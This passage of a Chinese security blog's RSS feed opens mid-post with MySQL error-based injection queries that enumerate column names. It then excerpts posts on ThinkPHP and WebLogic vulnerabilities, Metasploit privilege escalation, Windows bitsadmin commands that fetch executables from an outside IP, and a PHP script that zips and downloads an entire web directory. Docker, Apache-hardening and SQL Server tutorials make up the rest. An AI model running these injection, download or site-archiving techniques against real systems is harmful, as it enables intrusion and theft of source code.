mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id))c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;name&amp;#39;
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name))c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;content&amp;#39;
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content))c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;useragent&amp;#39;
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content,useragent))c);
ERROR 1241 (21000): Operand should contain 1 column(s)
&lt;/code>&lt;/pre>&lt;h3 id="0x03-mysql的隐式转换">0x03 MySQL的隐式转换&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>官方隐式转换规则&lt;/p></description></item><item><title>ThinkPHP5 的 where 函数使用不当存在注入</title><link>https://wyb0.cn/posts/2018/thinkphp5-where-function/</link><pubDate>Mon, 16 Apr 2018 19:16:14 +0000</pubDate><guid>https://wyb0.cn/posts/2018/thinkphp5-where-function/</guid><description>&lt;h3 id="0x00-关于thinkphp5的where函数">0x00 关于thinkphp5的where函数&lt;/h3>
&lt;p>年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。&lt;/p></description></item><item><title>WebLogic 反序列化漏洞 POC (CVE-2017-10271)</title><link>https://wyb0.cn/posts/2018/weblogic-cve-2017-10271-poc/</link><pubDate>Fri, 09 Mar 2018 09:20:03 +0000</pubDate><guid>https://wyb0.cn/posts/2018/weblogic-cve-2017-10271-poc/</guid><description>&lt;h3 id="0x00-weblogic-wls-组件反序列化漏洞">0x00 WebLogic WLS 组件反序列化漏洞&lt;/h3>
&lt;p>这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时存在漏洞可远程代码执行，凡是版本号 &amp;lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下&lt;/p></description></item><item><title>Metasploit 简单提权</title><link>https://wyb0.cn/posts/2018/msf-simple-elevate-privileges/</link><pubDate>Mon, 26 Feb 2018 13:43:20 +0000</pubDate><guid>https://wyb0.cn/posts/2018/msf-simple-elevate-privileges/</guid><description>&lt;h3 id="0x00-前提">0x00 前提&lt;/h3>
&lt;p>虚拟机有一个shell：&lt;code>http://10.11.11.20/a.php&lt;/code>，物理机IP是211.222.222.72&lt;br>
外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195&lt;/p></description></item><item><title>Windows 终端下载文件和执行远程文件</title><link>https://wyb0.cn/posts/2018/win-terminal-download-and-exec-remote-file/</link><pubDate>Tue, 06 Feb 2018 15:12:32 +0000</pubDate><guid>https://wyb0.cn/posts/2018/win-terminal-download-and-exec-remote-file/</guid><description>&lt;p>环境：Windows Server 2008 R2 Enterprise&lt;/p>
&lt;h3 id="0x00-bitsadmin下载文件">0x00 bitsadmin下载文件&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\T&lt;/span>emp&lt;span style="color:#ae81ff">\a&lt;/span>.exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\T&lt;/span>emp&lt;span style="color:#ae81ff">\a&lt;/span>.zip
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\T&lt;/span>emp&lt;span style="color:#ae81ff">\a&lt;/span>.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-certutil下载文件">0x01 certutil下载文件&lt;/h3>
&lt;p>保存在当前目录&lt;/p></description></item><item><title>Python 中执行系统命令</title><link>https://wyb0.cn/posts/2018/python-run-cmd/</link><pubDate>Mon, 29 Jan 2018 16:45:34 +0000</pubDate><guid>https://wyb0.cn/posts/2018/python-run-cmd/</guid><description>&lt;h3 id="0x00-使用模块">0x00 使用模块&lt;/h3>
&lt;p>在python执行系统命令一般可以通过3个模块来实现，这三个模块是：os、commands、subprocess&lt;/p></description></item><item><title>打包下载 php 文件</title><link>https://wyb0.cn/posts/2018/package-and-download-the-php-file/</link><pubDate>Mon, 08 Jan 2018 22:02:07 +0000</pubDate><guid>https://wyb0.cn/posts/2018/package-and-download-the-php-file/</guid><description>&lt;h3 id="0x00-代码如下">0x00 代码如下&lt;/h3>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php

function addFileToZip($zip,$zipname,$path){
 $handler = opendir($path);
 while(($filename = readdir($handler))!==false) {
 if($filename != &amp;#34;.&amp;#34; &amp;amp;&amp;amp; $filename != &amp;#34;..&amp;#34; &amp;amp;&amp;amp; $filename!= $zipname){
 if (is_dir($path.&amp;#34;/&amp;#34;.$filename)) { //如果读取的某个对象是文件夹，则递归
 addFileToZip($zip,$zipname,$path.&amp;#34;/&amp;#34;.$filename);
 } else {
 $zip-&amp;gt;addFile($path.&amp;#34;/&amp;#34;.$filename);
 }
 }
 }
 @closedir($path);
}

function tar($zipname,$path) {
 $zip = new ZipArchive(); //使用本类，linux需开启zlib，windows需取消php_zip.dll前的注释

 if ($zip-&amp;gt;open($zipname, ZipArchive::OVERWRITE) === TRUE) {
 addFileToZip($zip,$zipname,$path);$zip-&amp;gt;close();
 } else {
 exit(&amp;#39;Unable to open file, or file creation failed!&amp;#39;);
 }
}

function download($zipname) {
 if(!file_exists($zipname)){
 exit(&amp;#34;Zip file does not exist!&amp;#34;);
 } 
 header(&amp;#34;Cache-Control: public&amp;#34;);
 header(&amp;#34;Content-Description: File Transfer&amp;#34;);
 header(&amp;#39;Content-disposition: attachment; filename=&amp;#39;.basename($zipname)); //文件名
 header(&amp;#34;Content-Type: application/zip&amp;#34;); //zip格式的 
 header(&amp;#34;Content-Transfer-Encoding: binary&amp;#34;); //告诉浏览器，这是二进制文件
 header(&amp;#39;Content-Length: &amp;#39;. filesize($zipname)); //告诉浏览器，文件大小
 @readfile($zipname);

 unlink($zipname);
}

$zipname = &amp;#39;bak.zip&amp;#39;;
$path = &amp;#39;.&amp;#39;;
tar($zipname,$path);
download($zipname);

?&amp;gt;
&lt;/code>&lt;/pre>&lt;h4 id="reference侵删">Reference(侵删)：&lt;/h4>
&lt;ul>
&lt;li>&lt;a href="http://blog.csdn.net/libinemail/article/details/52190235">http://blog.csdn.net/libinemail/article/details/52190235&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>XXE 漏洞</title><link>https://wyb0.cn/posts/2017/xxe/</link><pubDate>Sat, 09 Dec 2017 23:02:22 +0000</pubDate><guid>https://wyb0.cn/posts/2017/xxe/</guid><description>&lt;h3 id="0x00-xxe">0x00 XXE&lt;/h3>
&lt;p>XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛&lt;/p></description></item><item><title>DNS 域传送漏洞</title><link>https://wyb0.cn/posts/2017/dns-zone-transfer/</link><pubDate>Mon, 20 Nov 2017 13:58:33 +0000</pubDate><guid>https://wyb0.cn/posts/2017/dns-zone-transfer/</guid><description>&lt;h3 id="0x00-dns域传送">0x00 DNS域传送&lt;/h3>
&lt;p>DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间则通过“DNS域传送”同步数据。&lt;/p>
&lt;p>若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录，从而节省许多搜集资产的时间。&lt;/p></description></item><item><title>中间件安全配置</title><link>https://wyb0.cn/posts/2017/middleware-security-configuration/</link><pubDate>Sat, 28 Oct 2017 13:58:29 +0000</pubDate><guid>https://wyb0.cn/posts/2017/middleware-security-configuration/</guid><description>&lt;h3 id="0x00-apache">0x00 Apache&lt;/h3>
&lt;ul>
&lt;li>服务器安全配置&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>#查看服务器运行权限
$ ps aux|grep apache|grep -v grep
$ sudo lsof -i:80
COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME
apache2 1377 root 4u IPv6 12596 0t0 TCP *:http (LISTEN)
apache2 21121 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN)
apache2 21122 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN)
apache2 21123 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN)
apache2 21124 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN)
apache2 21125 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN)
apache2 24800 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN)
apache2 127488 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN)

第一行是Apache主进程，以root权限运行的，因为Apache的Web端口是80或443，而在Ubuntu(Linux)中开启小于1024的端口需要root权限，所以主进程必须以root权限运行。
第二行起为Apache子进程，其执行用户为www-data，www-data是Ubuntu中运行Web服务的默认用户，权限较低。

Windows中Apache安装完成后默认是administrator权限，所以需要降权，创建一个用户Apache，用户组为Guests，然后将Apache目录下的日志的可写权限赋给Guests账户。
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>#目录及文件权限
修改配置文件，vim /etc/apache2/apache2.conf解决目录遍历漏洞
#Options Indexes FollowSymLinks
Options FollowSymLinks

或者使用chmod进行权限限制也可以,比如使用chmod o-r flag.txt命令将www-data的读权限去掉

windows也可以通过配置文件或者权限的设置达到上面设置的效果
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>#错误重定向一
$ sudo vim /etc/apache2/apache2.conf
&amp;lt;Directory /var/www/&amp;gt;
 Options Indexes FollowSymLinks
 #AllowOverride None
 AllowOverride All #设置如此
 Require all granted
&amp;lt;/Directory&amp;gt;
$ cat .htaccess
ErrorDocument 404 /404.html

#错误重定向二
$ sudo vim /etc/apache2/apache2.conf
LoadModule rewrite_module modules/mod_rewrite.so #去掉前面的注释符
$ sudo a2enmod rewrite #开启跳转
$ cat .htaccess
ErrorDocument 404 /404.html
RewriteEngine on
RewriteRule &amp;#34;ttt\.html$&amp;#34; aa.html
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>#隐藏apache版本号
$ sudo vim /etc/apache2/conf-available/security.conf
ServerTokens Prod
ServerSignature Off

#隐藏php版本号
$ sudo vim /etc/php5/apache2/php.ini
expose_php = Off
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>#禁止执行脚本
$ vim /etc/apache2/apache2.conf
&amp;lt;Directory /var/www/html/upload/&amp;gt; #禁止执行php
 php_flag engine off
&amp;lt;/Directory&amp;gt;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Apache日志格式&lt;/li>
&lt;/ul>
&lt;p>vim /etc/apache2/apache2.conf&lt;/p></description></item><item><title>Docker 之数据卷</title><link>https://wyb0.cn/posts/2017/docker-volume/</link><pubDate>Tue, 19 Sep 2017 10:35:09 +0000</pubDate><guid>https://wyb0.cn/posts/2017/docker-volume/</guid><description>&lt;h3 id="0x00-为什么使用数据卷">0x00 为什么使用数据卷&lt;/h3>
&lt;pre tabindex="0">&lt;code>Docker镜像是由多个文件系统(只读层)叠加而成的。
当一个容器启动时Docker会加载只读镜像层并在其上添加一个读写层。
读写层中的修改在镜像重新启动后会全部丢失。
在Docker中，只读层及在顶部的读写层的组合被称为Union File System(联合文件系统)。

如果想要保存数据，则可以使用数据卷来在容器外面保存数据，主要为如下两种方式：
* 使用docker run运行容器时指定数据卷
* 在Dockerfile中直接指定数据卷
&lt;/code>&lt;/pre>&lt;h3 id="0x01-通过docker-run挂载volume使用-v参数">0x01 通过docker run挂载Volume(使用-v参数)&lt;/h3>
&lt;ul>
&lt;li>不指定主机目录&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#运行完后容器中的根目录下就会多个data文件夹，这个就是数据卷&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker run -itd --name v_test -v /data debian:jessie /bin/bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@d145e8c6f874:/# ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bin data etc lib media opt root sbin sys usr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>boot dev home lib64 mnt proc run srv tmp var
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@d145e8c6f874:/# exit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#查看数据卷的对应位置，前者是宿主机的位置，后者是容器中的位置&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker inspect -f &lt;span style="color:#f92672">{{&lt;/span>.Mounts&lt;span style="color:#f92672">}}&lt;/span> v_test
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[{&lt;/span>volume 8f39f7de0f851e0bfbcfdd4561fbb20484f01f864ce00a159b09bdcdf743e068 /var/lib/docker/volumes/8f39f7de0f851e0bfbcfdd4561fbb20484f01f864ce00a159b09bdcdf743e068/_data /data local true &lt;span style="color:#f92672">}]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>指定主机目录(只能通过-v参数实现，Dockerfile不行)&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 本机的/home/var/docker_data和容器的/data对应&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker run -itd -v /home/var/docker_data:/data debian:jessie /bin/bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root@d853c4ca7632:/# exit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker inspect -f &lt;span style="color:#f92672">{{&lt;/span>.Mounts&lt;span style="color:#f92672">}}&lt;/span> d853c4ca7632
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[{&lt;/span>bind /home/var/docker_data /data true rprivate&lt;span style="color:#f92672">}]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker inspect -f &lt;span style="color:#f92672">{{&lt;/span>.Mounts&lt;span style="color:#f92672">}}&lt;/span> d853c4ca7632
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[{&lt;/span>bind /home/var/docker_data /data true rprivate&lt;span style="color:#f92672">}]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code># 本机创建文件，容器中就会同时出现
#宿主机创建文件
$ sudo touch /home/var/docker_data/a.txt

#容器可以查看到文件同样被创建
root@8e1ccd30fe33:/# ls data/
a.txt
&lt;/code>&lt;/pre>&lt;h3 id="0x02-通过dockerfile声明volume">0x02 通过Dockerfile声明Volume&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>FROM debian:jessie VOLUME /data &lt;span style="color:#75715e">#之后的任何命令都不能更改Volume的任何东西&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x03-数据共享">0x03 数据共享&lt;/h3>
&lt;p>使用&amp;ndash;volumes-from参数项即可访问另外一个容器的Volume。&lt;br>
因为数据容器不启动也可以被其它容器访问，所以一般不推荐启动数据容器。&lt;/p></description></item><item><title>Docker 之 Dockerfile</title><link>https://wyb0.cn/posts/2017/docker-dockerfile/</link><pubDate>Fri, 18 Aug 2017 18:05:43 +0000</pubDate><guid>https://wyb0.cn/posts/2017/docker-dockerfile/</guid><description>&lt;p>操作系统：macOS Sierra 10.12.6&lt;br>
Docker版本：Docker version 18.09.0, build 4d60db4&lt;/p>
&lt;h3 id="0x00-dockerfile">0x00 Dockerfile&lt;/h3>
&lt;pre tabindex="0">&lt;code>Dockerfile里面其实是一条条的指令，Docker会把Dockerfile的指令翻译为linux命令，
每一条指令都会创建一个镜像，下一条指令将在这个镜像的基础上进行修改操作后再生成一个镜像。
让你可以对下载好的镜像进行一些操作(比如安装软件、向镜像复制文件等)，从而构造定制化的镜像。
&lt;/code>&lt;/pre>&lt;h3 id="0x01-dockerfile基本指令">0x01 Dockerfile基本指令&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>FROM &amp;lt;image name&amp;gt;：指定新的镜像基于什么创建&lt;span style="color:#f92672">(&lt;/span>可以尝试使用alpine:latest和debian:jessie&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MAINTAINER &amp;lt;author name&amp;gt;：设置该镜像的作者
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>COPY &amp;lt;source&amp;gt; &amp;lt;dest&amp;gt;：复制文件，dest要以 / 结尾
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WORKDIR /path/to/workdir：相当于切换目录，对RUN、CMD、和ENTRYPOINT生效
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>RUN &amp;lt;command&amp;gt;：在shell执行命令
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>EXPOSE port1 port2：容器运行时监听的端口
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CMD：容器默认的执行命令，Dockerfile只允许使用一次CMD命令&lt;span style="color:#f92672">(&lt;/span>使用数组&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ENTRYPOINT：类似于CMD，Dockerfile只允许使用一次&lt;span style="color:#f92672">(&lt;/span>使用数组&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ENV &amp;lt;key&amp;gt; &amp;lt;value&amp;gt;：设置环境变量
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>USER &amp;lt;uid&amp;gt;：镜像正在运行时设置一个uid，即设定启动容器的用户，默认为root
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>VOLUME &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/data&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span>：授权访问从容器内到主机的目录
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>CMD与ENTRYPOINT的区别：&lt;/p></description></item><item><title>Docker 之镜像与容器</title><link>https://wyb0.cn/posts/2017/docker-image-and-container/</link><pubDate>Fri, 18 Aug 2017 14:36:39 +0000</pubDate><guid>https://wyb0.cn/posts/2017/docker-image-and-container/</guid><description>&lt;p>操作系统：Ubuntu14.04.1&lt;br>
Docker版本：Docker version 17.06.0-ce, build 02c1d87&lt;/p>
&lt;h3 id="0x00-镜像操作">0x00 镜像操作&lt;/h3>
&lt;ul>
&lt;li>下载镜像&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#一般镜像、容器的id和name可以互换&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker search ubuntu &lt;span style="color:#75715e">#从公共registry搜索镜像&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker pull ubuntu &lt;span style="color:#75715e">#从公共registry下载镜像&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker pull ubuntu:14.04
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>查看当前系统镜像&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker images
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>REPOSITORY TAG IMAGE ID CREATED SIZE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ubuntu 14.04 7e4b16ae8b23 &lt;span style="color:#ae81ff">11&lt;/span> days ago 188MB
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ubuntu latest 1d9c17228a9e &lt;span style="color:#ae81ff">11&lt;/span> days ago 86.7MB
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>查看镜像层组成&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker history ubuntu:14.04 &lt;span style="color:#75715e"># ubuntu:14.04可以用7e4b16ae8b23替代，用id和images_name:tag效果一样&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>删除镜像(删除镜像前要先删除上面的容器)&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ docker rmi ubuntu:latest &lt;span style="color:#75715e"># 也可docker rmi 1d9c17228a9e&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-容器操作">0x01 容器操作&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>运行容器(exit后容器就停止了)&lt;/p></description></item><item><title>Docker 初识</title><link>https://wyb0.cn/posts/2017/docker-basis/</link><pubDate>Tue, 15 Aug 2017 22:16:35 +0000</pubDate><guid>https://wyb0.cn/posts/2017/docker-basis/</guid><description>&lt;h3 id="0x00-关于docker">0x00 关于Docker&lt;/h3>
&lt;ul>
&lt;li>Docker中的镜像类似VM的快照，容器类似虚拟机，使用镜像创建容器类似于使用快照创建虚拟机。&lt;/li>
&lt;li>Docker中运行应用的是容器，容器的创建和销毁在秒级就能完成。&lt;/li>
&lt;li>Docker使用了AUFS，可以以递进的方式创建&amp;quot;VM&amp;quot;，一个&amp;quot;VM&amp;quot;叠在另一个&amp;quot;VM&amp;quot;上，就像使用git增量开发一样。&lt;/li>
&lt;li>软件的运行环境（image）和软件本身（container）分离，和数据也分离。&lt;/li>
&lt;/ul>
&lt;p>学习Docker需要了解4个概念：镜像、容器、数据卷、链接&lt;/p></description></item><item><title>[转] HTTPS 加密原理简介</title><link>https://wyb0.cn/posts/2017/introduction-to-https-encryption-principles/</link><pubDate>Tue, 01 Aug 2017 18:16:39 +0000</pubDate><guid>https://wyb0.cn/posts/2017/introduction-to-https-encryption-principles/</guid><description>&lt;p>原文链接：http://www.cnblogs.com/JeffreySun/archive/2010/06/24/1627247.html&lt;/p></description></item><item><title>使用 Python 读写 xml 文件</title><link>https://wyb0.cn/posts/2017/python-read-and-write-xml/</link><pubDate>Thu, 20 Jul 2017 14:20:26 +0000</pubDate><guid>https://wyb0.cn/posts/2017/python-read-and-write-xml/</guid><description>&lt;h3 id="0x00-解析xml的方法">0x00 解析XML的方法&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>SAX (simple API for XML)&lt;br>
python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。&lt;/p></description></item><item><title>MRQ 的使用</title><link>https://wyb0.cn/posts/2017/python-module-mrq/</link><pubDate>Mon, 10 Jul 2017 16:30:43 +0000</pubDate><guid>https://wyb0.cn/posts/2017/python-module-mrq/</guid><description>&lt;h3 id="0x00-mrq">0x00 MRQ&lt;/h3>
&lt;ul>
&lt;li>MRQ是Python基于Redis、Mongo和gevent的分布式任务队列。&lt;/li>
&lt;li>MRQ一方面旨在像RQ一样简单，另一方面有接近Celery的性能。&lt;/li>
&lt;li>MRQ最初的功能设计是为了满足任务队列的各种任务需求(IO密集&amp;amp;CPU密集，很多小任务&amp;amp;几个大任务)。&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-设置mongo和redis">0x01 设置mongo和redis&lt;/h3>
&lt;p>因为mrq依赖于redis和mongo，所以先安装设置下&lt;/p></description></item><item><title>AJAX 之跨域</title><link>https://wyb0.cn/posts/2017/ajax-cross-domain/</link><pubDate>Thu, 22 Jun 2017 15:18:29 +0000</pubDate><guid>https://wyb0.cn/posts/2017/ajax-cross-domain/</guid><description>&lt;h3 id="0x00-简介">0x00 简介&lt;/h3>
&lt;p>当使用AJAX请求其他域名下的数据时会出现拒绝访问的情况，这是出于安全考虑，AJAX只能访问本地的资源，而不能跨域访问。&lt;/p></description></item><item><title>SSI 注入</title><link>https://wyb0.cn/posts/2017/ssi-injection/</link><pubDate>Thu, 08 Jun 2017 11:20:15 +0000</pubDate><guid>https://wyb0.cn/posts/2017/ssi-injection/</guid><description>&lt;h3 id="0x00-ssi">0x00 SSI&lt;/h3>
&lt;p>SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。&lt;/p></description></item><item><title>SQLServer 存储过程</title><link>https://wyb0.cn/posts/2017/sqlserver-stored-procedure/</link><pubDate>Tue, 30 May 2017 13:16:18 +0000</pubDate><guid>https://wyb0.cn/posts/2017/sqlserver-stored-procedure/</guid><description>&lt;h3 id="0x00-数据表结构">0x00 数据表结构&lt;/h3>
&lt;pre tabindex="0">&lt;code>CREATE DATABASE student;

CREATE TABLE info
(
 id INT IDENTITY(1,1) PRIMARY KEY NOT NULL,
 name VARCHAR(20) NOT NULL DEFAULT &amp;#39;xiaoming&amp;#39;,
 sex INT NOT NULL DEFAULT 1,
 age INT NOT NULL DEFAULT 0,
 hight INT NOT NULL DEFAULT 0
)

INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaohong&amp;#39;,0,23,165);
INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaogang&amp;#39;,1,24,175);
INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaoliu&amp;#39;,1,21,160);
INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaozhang&amp;#39;,1,19,165);
INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaoli&amp;#39;,1,23,170);
INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaohua&amp;#39;,0,23,160);
INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaoming&amp;#39;,1,21,165);
INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaowang&amp;#39;,1,23,166);
INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaojuan&amp;#39;,0,21,159);
&lt;/code>&lt;/pre>&lt;h3 id="0x01-存储过程">0x01 存储过程&lt;/h3>
&lt;pre tabindex="0">&lt;code>--如果存在名为get_student_msg(相当于函数)的存储过程则删除
IF EXISTS (SELECT name FROM sysobjects WHERE name=&amp;#39;get_student_msg&amp;#39; AND type=&amp;#39;p&amp;#39;)
 DROP PROCEDURE get_student_msg

CREATE PROCEDURE get_student_msg --创建存储过程
 @name VARCHAR(20) --声明全局变量
AS
 BEGIN
 SELECT * from info
 WHERE name=@name
 END
GO

--创建好存储过程后在其他地方直接使用函数并传参就行了
EXEC get_student_msg &amp;#39;xiaoli&amp;#39;
&lt;/code>&lt;/pre>&lt;h3 id="0x02-使用游标的存储过程">0x02 使用游标的存储过程&lt;/h3>
&lt;pre tabindex="0">&lt;code>-- 使用DECLARE声明局部变量，一般在函数和存储过程中使用
DECLARE @name VARCHAR(20)
DECLARE @sex INT
DECLARE @age INT
DECLARE @hight INT

DECLARE stu_cursor CURSOR FOR --定义游标，后面跟sql语句
SELECT name,sex,age,hight --使用游标的对象(根据需要写select语句)
FROM dbo.info
